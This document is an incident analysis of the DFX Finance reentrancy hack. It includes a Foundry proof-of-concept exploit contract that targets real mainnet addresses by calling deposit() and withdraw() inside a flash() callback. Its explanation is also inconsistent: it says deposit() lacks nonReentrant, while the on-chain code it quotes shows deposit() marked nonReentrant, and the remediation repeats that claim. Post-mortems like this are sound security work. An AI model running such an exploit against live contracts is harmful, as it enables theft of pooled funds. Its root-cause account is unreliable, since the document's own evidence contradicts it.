# DFX Finance — Reentrancy Attack via deposit() within flash() Callback Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | DFX Finance |
| **Chain** | Ethereum Mainnet |
| **Loss** | Unconfirmed (~$7.5M estimated) |
| **XIDR Token** | [0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52](https://etherscan.io/address/0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **DFX Curve** | [0x46161158b1947D9149E066d6d31AF1283b2d377C](https://etherscan.io/address/0x46161158b1947D9149E066d6d31AF1283b2d377C) |
| **Uniswap V3 Router** | [0xE592427A0AEce92De3Edee1F18E0157C05861564](https://etherscan.io/address/0xE592427A0AEce92De3Edee1F18E0157C05861564) |
| **Root Cause** | Missing `nonReentrant` on `deposit()` during `flash()` callback execution — reentrancy enables double-minting of LP tokens |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/DFX_exp.sol) |

---
## 1. Vulnerability Overview

DFX Finance is a Curve-style AMM specialized for foreign exchange (FX), supporting stablecoin pairs such as XIDR/USDC. The contract provided a native `flash()` flash loan feature, but had no protection against reentrancy where `deposit()` could be called again during the flash loan callback execution. The attacker borrowed XIDR and USDC via `flash()`, then called `deposit()` with the same tokens inside the callback. Because the flash-loaned tokens were still held by the contract when `deposit()` executed, LP tokens were minted in double. The attacker then burned the LP tokens to withdraw more tokens than they were entitled to.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable DFX Curve - allows deposit() reentrancy during flash()
contract DFXCurve {
    // Flash loan functionality
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // Transfer tokens to recipient
        IERC20(token0).transfer(recipient, amount0);
        IERC20(token1).transfer(recipient, amount1);

        // ❌ deposit() reentrancy possible during callback execution
        // No nonReentrant guard
        IFlashCallback(recipient).flashCallback(amount0, amount1, data);

        // Verify repayment
        require(IERC20(token0).balanceOf(address(this)) >= reserve0 + fee0);
        require(IERC20(token1).balanceOf(address(this)) >= reserve1 + fee1);
    }

    function deposit(uint256 amount, uint256 deadline)
        external returns (uint256 lpAmount) {
        // ❌ On reentry during flash() execution, reserves have not yet been updated
        // Tokens transferred via flash are still held in the contract, creating an imbalanced state
        uint256 balance0 = IERC20(token0).balanceOf(address(this));
        uint256 balance1 = IERC20(token1).balanceOf(address(this));

        // LP minted based on current balance — which includes the flash loan amount
        lpAmount = _calculateLPAmount(balance0, balance1, amount);
        _mint(msg.sender, lpAmount);
    }
}

// ✅ Correct pattern - applying ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeDFXCurve is ReentrancyGuard {
    function flash(...) external nonReentrant {
        // ...
    }

    function deposit(...) external nonReentrant returns (uint256 lpAmount) {
        // ...
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified — address 0x46161158b1947D9149E066d6d31AF1283b2d377C (DFX XIDR/USDC Curve, Ethereum Mainnet)


**Curve.sol** — Entry point:
```solidity
// ❌ Root cause: Missing `nonReentrant` on `deposit()` during `flash()` callback execution — reentrancy enables double-minting of LP tokens
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external transactable noDelegateCall isNotEmergency {
        uint256 fee = curve.epsilon.mulu(1e18);
        
        require(IERC20(derivatives[0]).balanceOf(address(this)) > 0, 'Curve/token0-zero-liquidity-depth');  // ❌ Direct reference to current balance — manipulable
        require(IERC20(derivatives[1]).balanceOf(address(this)) > 0, 'Curve/token1-zero-liquidity-depth');
        
        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e18);
        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e18);
        uint256 balance0Before = IERC20(derivatives[0]).balanceOf(address(this));
        uint256 balance1Before = IERC20(derivatives[1]).balanceOf(address(this));

        if (amount0 > 0) IERC20(derivatives[0]).safeTransfer(recipient, amount0);
        if (amount1 > 0) IERC20(derivatives[1]).safeTransfer(recipient, amount1);

        IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);

        uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));
        uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));

        require(balance0Before.add(fee0) <= balance0After, 'Curve/insufficient-token0-returned');
        require(balance1Before.add(fee1) <= balance1After, 'Curve/insufficient-token1-returned');

        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee
        uint256 paid0 = balance0After - balance0Before;
        uint256 paid1 = balance1After - balance1Before;

        IERC20(derivatives[0]).safeTransfer(owner, paid0);        
        IERC20(derivatives[1]).safeTransfer(owner, paid1);        

        emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);
    }    

    function deposit(uint256 _deposit, uint256 _deadline)  // ❌ Vulnerable
        external
        deadline(_deadline)
        transactable
        nonReentrant
        noDelegateCall
        notInWhitelistingStage
        isNotEmergency
        returns (uint256, uint256[] memory)
    {
        // (curvesMinted_,  deposits_)
        return ProportionalLiquidity.proportionalDeposit(curve, _deposit);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 2 WETH → USDC (Uniswap V3)
    │       Acquire USDC
    │
    ├─[2] Half USDC → XIDR (Uniswap V3)
    │       Acquire XIDR
    │
    ├─[3] Call DFX.flash(attacker, xidrAmount, usdcAmount, data)
    │       → XIDR, USDC transferred to attacker
    │       → Enter flashCallback() callback
    │
    ├─[4] [Inside callback] Call DFX.deposit(200_000 XIDR) ← ❌ Reentrancy
    │       Contract holds excess balance from flash loan
    │       → LP tokens over-minted based on excess balance
    │       Receive LP tokens
    │
    ├─[5] [Inside callback] Call DFX.withdraw(lpAmount)
    │       Burn over-minted LP tokens
    │       → Receive more XIDR + USDC than entitled
    │
    ├─[6] Repay flash loan (principal + fee)
    │
    ├─[7] Remaining XIDR → USDC (Uniswap V3)
    │
    └─[8] Net profit: USDC
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDFXCurve {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function deposit(uint256 amount, uint256 deadline) external returns (uint256, uint256);
    function withdraw(uint256 amount, uint256 deadline) external returns (uint256, uint256);
    function viewDeposit(uint256 amount) external view returns (uint256, uint256[] memory);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IUniV3Router {
    struct ExactInputSingleParams {
        address tokenIn; address tokenOut; uint24 fee;
        address recipient; uint256 deadline;
        uint256 amountIn; uint256 amountOutMinimum; uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DFXExploit is Test {
    IDFXCurve dfx       = IDFXCurve(0x46161158b1947D9149E066d6d31AF1283b2d377C);
    IUniV3Router router = IUniV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 XIDR         = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
    IERC20 USDC         = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH         = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_941_703);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);

        // [Step 1] 2 WETH → USDC
        WETH.approve(address(router), type(uint256).max);
        router.exactInputSingle(IUniV3Router.ExactInputSingleParams({
            tokenIn: address(WETH), tokenOut: address(USDC), fee: 500,
            recipient: address(this), deadline: block.timestamp,
            amountIn: 2e18, amountOutMinimum: 0, sqrtPriceLimitX96: 0
        }));

        // [Step 2] Half USDC → XIDR
        uint256 half = USDC.balanceOf(address(this)) / 2;
        USDC.approve(address(router), type(uint256).max);
        router.exactInputSingle(IUniV3Router.ExactInputSingleParams({
            tokenIn: address(USDC), tokenOut: address(XIDR), fee: 500,
            recipient: address(this), deadline: block.timestamp,
            amountIn: half, amountOutMinimum: 0, sqrtPriceLimitX96: 0
        }));

        // [Step 3] Execute DFX flash loan
        (, uint256[] memory amounts) = dfx.viewDeposit(200_000 * 1e6);
        uint256 flashXIDR = amounts[0] * 995 / 1000; // 0.5% discount
        uint256 flashUSDC = amounts[1] * 995 / 1000;

        dfx.flash(address(this), flashXIDR, flashUSDC, "");

        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
    }

    // ⚡ Flash loan callback - deposit() reentrancy
    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        require(msg.sender == address(dfx), "Not DFX");

        // [Step 4] Reentrancy: call deposit() while flash loan tokens are still in the contract
        XIDR.approve(address(dfx), type(uint256).max);
        USDC.approve(address(dfx), type(uint256).max);
        (uint256 lpMinted,) = dfx.deposit(200_000 * 1e6, block.timestamp);

        // [Step 5] Burn LP tokens to recover excess tokens
        dfx.approve(address(dfx), type(uint256).max);
        dfx.withdraw(lpMinted, block.timestamp);

        // [Step 6] Repay flash loan (principal + fee)
        // (Transfer repayment amount to dfx)
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy of deposit() within flash() callback |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | Reentrancy Attack (flash loan callback variant) |
| **Attack Vector** | `flash()` → reenter `deposit()` inside `flashCallback()` → double-mint LP → `withdraw()` |
| **Preconditions** | Neither `flash()` nor `deposit()` has `nonReentrant` guard |
| **Impact** | LP token double-minting → excess asset withdrawal |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Apply the `nonReentrant` modifier to all of `flash()`, `deposit()`, and `withdraw()` functions.
2. **State lock during flash loan**: Set a `locked` flag during `flash()` execution to block all state-changing functions.
3. **Update reserves before callback**: Update internal reserves before executing the callback so that `deposit()` does not calculate based on a balance that includes the flash loan amount.

---
## 7. Lessons Learned

- **Danger of native flash loans**: Unlike external flash loans (Aave, dYdX), a protocol's own `flash()` function is more susceptible to reentrancy. Because the callback can invoke other functions on the same contract, reentrancy protection is required on all public functions.
- **Expanded scope of reentrancy**: Reentrancy is not limited to the simple `withdraw()` → `receive()` → `withdraw()` pattern. Calling `deposit()` from within a `flash()` callback is also reentrancy, and it can corrupt the shared state (reserves, LP calculations) between the two functions.
- **AMM invariants**: An AMM contract must satisfy `reserve == balanceOf` at all times. Flash loans intentionally break this invariant, so during flash loan execution, other functions that depend on this invariant must be prevented from running.